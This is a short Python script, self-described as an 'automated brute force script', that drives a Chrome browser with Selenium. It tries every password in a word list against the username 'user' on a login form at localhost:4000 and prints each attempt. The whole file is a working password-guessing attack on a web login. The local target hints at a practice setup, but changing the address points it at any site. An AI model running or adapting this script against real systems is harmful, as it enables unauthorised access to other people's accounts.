#automated brute force script

from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import time

driver =  webdriver.Chrome(ChromeDriverManager().install())

def startPage():
    driver.get("http://localhost:4000")

def login():
    count = 0
    f1 = open('words.txt', "r")
    if f1.mode == 'r':
        passlist = f1.read().splitlines()
    f1.close()
    for x in range(0, len(passlist)):
        driver.find_element_by_name("username").send_keys("user")
        driver.find_element_by_name("password").send_keys(str(passlist[x]))
        time.sleep(2)
        driver.find_element_by_name("login").click()
        time.sleep(2)
        count += 1
        print("Last try: ", passlist[x])

startPage()
time.sleep(2)
login()